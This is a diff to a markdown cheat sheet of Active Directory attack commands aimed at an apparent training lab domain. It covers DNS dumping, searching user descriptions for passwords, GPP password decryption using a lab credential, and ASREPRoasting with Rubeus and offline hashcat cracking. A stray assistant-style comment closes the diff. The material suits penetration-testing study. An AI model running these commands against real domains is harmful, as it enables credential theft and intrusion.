@@ -149,18 +149,29 @@ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
 ```
 
-### Example: GPP Password Decryption
+### GPP Password Decryption
 
 ```bash
 gpp-decrypt <cpassword>
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
 ```
 
-### Example: ASREPRoasting
+### ASREPRoasting
+
+#### Method 1: PowerView + Rubeus + Hashcat
 
 ```powershell
+# 1. Enumerate users with pre-auth not required
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+# 2. Extract AS-REP hash
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 ```
+
 ```bash
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+# 3. Crack hash offline
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+```
+```
+
+This version is much more concise, showing just the essential commands for each method without the verbose output, making it clean and easy to reference quickly.
